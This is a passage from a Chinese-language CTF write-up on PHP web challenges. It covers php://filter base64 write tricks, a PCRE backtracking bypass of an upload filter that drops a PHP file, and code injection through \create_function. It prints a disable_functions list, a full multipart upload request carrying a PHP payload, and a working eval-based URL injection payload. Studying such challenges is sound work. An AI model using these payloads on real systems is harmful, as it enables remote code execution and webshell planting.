system,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log
```

遂写入一句话

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612862129141-c33a1d2b-6fca-4f55-a956-bf4e8f8d1d67.png)



## 附录：php://伪协议+base64
### php://伪协议
> [https://www.php.net/manual/zh/filters.php](https://www.php.net/manual/zh/filters.php)
>

常用的过滤器

```php
php://filter/write=convert.base64-decode/resource=123.php

string.rot13		使用此过滤器等同于用 str_rot13()函数处理所有的流数据。

convert.base64-encode
convert.base64-decode
	使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。


```

### base64
+ 字符集为`A-Za-z0-9+/`，即`52`+`10`+`2`=`64`
+ 转换后的字符串理论上将要比原来的长**1/3**
+ **每76个字符**加一个换行符

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612862876566-8e3e335c-e10a-4d58-98b4-74727195c383.png)





---

# 0x02 easy PCREWaf
```php
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) { //必须绕过此处判断；使其返回false
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
} 1
```

## 正则回溯
在PCRE的正则匹配中，匹配时可能存在回溯，而且回溯是有最大次数限制滴，默认为`1000000`，也就是一百万次，超过了以后就会返回`False`

> 在正则匹配当中，如果存在符号 " .*? " ，那么匹配的时候便会使用非贪婪模式。非贪婪模式匹配原理简单来说就是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再回溯, 进行匹配。
>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1610694554465-70bfb847-8147-4c1b-9fc5-a01d95a8ad83.png)

那么就用burp的intruder，直接冲

```basic
POST /index.php HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http:///
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypB0gAWHTqJuJqsmL
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http:///
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarypB0gAWHTqJuJqsmL
Content-Disposition: form-data; name="file"; filename="DirBusterReport.txt"
Content-Type: text/plain

<?php phpinfo();?>
[A*100,0000]...
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1610694355831-d3cdd506-586c-4df6-bece-5048c574a598.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1610694333038-c776aa10-e9d1-4988-9b2c-f11f3a5423ed.png)



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1610694277842-101736d6-dc9a-49cf-8b0b-b34a865c4e1a.png)

参考文章：[利用PCRE回溯绕过PHP中的正则表达式 · 语雀](https://www.yuque.com/henry-weply/kb/es4kkx)

---

# 0x01 function
```php
<?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1610682374658-9264314a-a838-4818-bee6-60f29a061ea3.png)

## create_function
首先介绍一下：`create_function`函数

> **create_function** ( <font style="color:#669933;">string</font> `$args` , <font style="color:#669933;">string</font> `$code` ) : <font style="color:#669933;">string</font>
>
> (PHP 4 >= 4.0.1, PHP 5, PHP 7)
>
> **警告**
>
> This function internally performs an [eval()](https://www.php.net/manual/zh/function.eval.php) and as such has the same security issues as [eval()](https://www.php.net/manual/zh/function.eval.php). Additionally it has bad performance and memory usage characteristics.
>
> If you are using PHP 5.3.0 or newer a native [anonymous function](https://www.php.net/manual/zh/functions.anonymous.php) should be used instead.
>

它本身呢，其实还存在命令注入的问题，怎么个注入法？

```basic
create_function('', 'echo 111;}phpinfo();//')

==>

function x(){
    echo 111;}phpinfo();//
}
```

也就是说，`php`将第二参数直接拼接到了匿名函数中，也就是上面的6行，可以完整地被我们控制！

```basic
/?action=\create_function&arg=return 111;}eval($_GET[1]);/*&1=phpinfo();
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1610682830529-9381b74f-713a-4d4c-b0ec-216f31663542.png)

那我们再看下，`preg_match('/^[a-z0-9_]*$/isD', $action)`这个正则。它要求咱们输入的`action`必须不能是全字符or数字，也就是得找一个不影响函数执行

## 全局空间
> 如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间。在名称前加上前缀` \ `表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。`\`是默认的命名空间。
>

所以，可以用`\foo();`   的写法，来调用全局空间函数 `"foo"`，同理，`\create_function`也就能绕过了。

